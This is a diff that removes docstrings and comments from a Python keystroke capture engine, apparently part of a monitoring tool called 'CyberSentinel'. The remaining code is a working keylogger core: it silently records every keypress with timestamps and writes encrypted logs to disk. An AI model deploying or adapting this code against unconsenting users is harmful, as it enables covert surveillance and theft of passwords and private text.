@@ -1,20 +1,3 @@
-"""
-CyberSentinel - Keystroke Capture Engine
-==========================================
-Core keystroke monitoring engine using pynput.
-Captures keystrokes with timestamps, buffers them,
-and writes encrypted logs to disk.
-
-Features:
-    - Buffered keystroke capture
-    - Special key mapping
-    - Timestamp per keystroke
-    - Auto-flush on buffer full or timer
-    - Encrypted log output
-    - Session metadata tracking
-    - Thread-safe operation
-"""
-
 import threading
 import time
 import json
@@ -43,7 +26,6 @@ from config.settings import (
 from utils.encryption import EncryptionManager
 
 
-# Mapping of special keys to readable names
 SPECIAL_KEY_MAP = {
     keyboard.Key.space: " [SPACE] ",
     keyboard.Key.enter: " [ENTER]\n",
@@ -84,42 +66,30 @@ SPECIAL_KEY_MAP = {
 
 
 class KeystrokeEngine:
-    """
-    Core keystroke capture engine.
-    Captures keyboard input, buffers it, and writes
-    encrypted logs in the configured format.
-    """
 
     def __init__(self, encryption_manager: EncryptionManager = None):
-        # Encryption
         self.crypto = encryption_manager or EncryptionManager()
 
-        # Keystroke buffer
         self._buffer = deque(maxlen=10000)
         self._buffer_lock = threading.Lock()
-        self._recent_keys = deque(maxlen=500)  # For dashboard display
+        self._recent_keys = deque(maxlen=500)
 
-        # Session tracking
         self.session_id = SESSION_ID
         self.start_time = None
         self.total_keystrokes = 0
         self.keys_per_minute = 0.0
 
-        # State
         self._running = False
         self._listener = None
         self._flush_timer = None
         self._stats_timer = None
         self._log_file = LOG_DIR / f"{LOG_FILE_PREFIX}_{SESSION_ID}.{LOG_FORMAT}.enc"
 
-        # Callbacks
         self._on_key_callback = None
 
-        # Write session header
         self._write_session_header()
 
     def _write_session_header(self):
-        """Write session metadata header to log file."""
         if WATERMARK_LOGS:
             header = {
                 "session_id": self.session_id,
@@ -137,18 +107,15 @@ class KeystrokeEngine:
                 f.write(encrypted_header + "\n")
 
     def set_key_callback(self, callback):
-        """Set a callback function called on each keystroke for real-time UI updates."""
         self._on_key_callback = callback
 
     def start(self):
-        """Start the keystroke capture engine."""
         if self._running:
             return
 
         self._running = True
         self.start_time = datetime.now()
 
-        # Start keyboard listener
         self._listener = keyboard.Listener(
             on_press=self._on_key_press,
             on_release=self._on_key_release,
@@ -156,13 +123,10 @@ class KeystrokeEngine:
         self._listener.daemon = True
         self._listener.start()
 
-        # Start periodic flush timer
         self._start_flush_timer()
 
-        # Start stats calculation timer
         self._start_stats_timer()
 
-        # Schedule auto-stop
         if AUTO_STOP_HOURS > 0:
             auto_stop = threading.Timer(
                 AUTO_STOP_HOURS * 3600,
@@ -172,31 +136,25 @@ class KeystrokeEngine:
             auto_stop.start()
 
     def stop(self):
-        """Stop the keystroke capture engine and flush remaining buffer."""
         if not self._running:
             return
 
         self._running = False
 
-        # Stop listener
         if self._listener:
             self._listener.stop()
             self._listener = None
 
-        # Cancel timers
         if self._flush_timer:
             self._flush_timer.cancel()
         if self._stats_timer:
             self._stats_timer.cancel()
 
-        # Final flush
         self._flush_buffer()
 
-        # Write session footer
         self._write_session_footer()
 
     def _on_key_press(self, key):
-        """Handle key press events."""
         if not self._running:
             return False
 
@@ -204,56 +162,46 @@ class KeystrokeEngine:
         key_str = self._key_to_string(key)
 
         if key_str is None:
-            return  # Skip unmapped special keys when CAPTURE_SPECIAL_KEYS is False
+            return
 
-        # Create keystroke record
         record = {
             "key": key_str,
             "event": "press",
             "timestamp": timestamp,
         }
 
-        # Add to buffer
         with self._buffer_lock:
             self._buffer.append(record)
             self._recent_keys.append(key_str)
             self.total_keystrokes += 1
 
-        # Trigger callback for real-time display
         if self._on_key_callback:
             try:
                 self._on_key_callback(record)
             except Exception:
                 pass
 
-        # Check if buffer should be flushed
         if len(self._buffer) >= BUFFER_SIZE:
             self._flush_buffer()
 
     def _on_key_release(self, key):
-        """Handle key release events (used for modifier key tracking)."""
-        pass  # Can be extended for key-combination detection
+        pass
 
     def _key_to_string(self, key) -> str:
-        """Convert a key event to a readable string."""
-        # Check if it's a special key
         if isinstance(key, keyboard.Key):
             if not CAPTURE_SPECIAL_KEYS:
-                # Still capture essential keys
                 if key in (keyboard.Key.space, keyboard.Key.enter,
                            keyboard.Key.tab, keyboard.Key.backspace):
                     return SPECIAL_KEY_MAP.get(key, "")
                 return None
             return SPECIAL_KEY_MAP.get(key, f" [{key.name.upper()}] ")
 
-        # Regular character key
         try:
             return key.char if key.char else ""
         except AttributeError:
             return ""
 
     def _flush_buffer(self):
-        """Flush the keystroke buffer to encrypted disk storage."""
         with self._buffer_lock:
             if not self._buffer:
                 return
@@ -262,7 +210,6 @@ class KeystrokeEngine:
             self._buffer.clear()
 
         try:
-            # Format records based on configured format
             if LOG_FORMAT == "json":
                 formatted = json.dumps(records, indent=None)
             elif LOG_FORMAT == "csv":
@@ -271,20 +218,17 @@ class KeystrokeEngine:
                 for record in records:
                     writer.writerow(record)
                 formatted = output.getvalue()
-            else:  # txt
+            else:
                 formatted = "".join(r["key"] for r in records)
 
-            # Encrypt and write
             encrypted = self.crypto.encrypt(formatted)
             with open(self._log_file, "a", encoding="utf-8") as f:
                 f.write(encrypted + "\n")
 
         except Exception as e:
-            # Fail silently to not interrupt monitoring
             pass
 
     def _start_flush_timer(self):
-        """Start periodic buffer flush timer."""
         if not self._running:
             return
 
@@ -296,13 +240,11 @@ class KeystrokeEngine:
         self._flush_timer.start()
 
     def _periodic_flush(self):
-        """Periodic flush callback."""
         self._flush_buffer()
         if self._running:
             self._start_flush_timer()
 
     def _start_stats_timer(self):
-        """Start periodic stats calculation."""
         if not self._running:
             return
 
@@ -311,7 +253,6 @@ class KeystrokeEngine:
         self._stats_timer.start()
 
     def _calculate_stats(self):
-        """Calculate typing statistics."""
         if self.start_time:
             elapsed_minutes = (
                 datetime.now() - self.start_time
@@ -325,12 +266,10 @@ class KeystrokeEngine:
             self._start_stats_timer()
 
     def _auto_stop(self):
-        """Auto-stop after configured hours."""
         if self._running:
             self.stop()
 
     def _write_session_footer(self):
-        """Write session summary footer to log file."""
         footer = {
             "session_ended": datetime.now().isoformat(),
             "total_keystrokes": self.total_keystrokes,
@@ -347,11 +286,9 @@ class KeystrokeEngine:
             f.write(encrypted_footer + "\n")
 
     def get_recent_keys(self, count: int = 200) -> list:
-        """Get the most recent keystrokes for display."""
         return list(self._recent_keys)[-count:]
 
     def get_stats(self) -> dict:
-        """Get current session statistics."""
         elapsed = 0
         if self.start_time:
             elapsed = (datetime.now() - self.start_time).total_seconds()
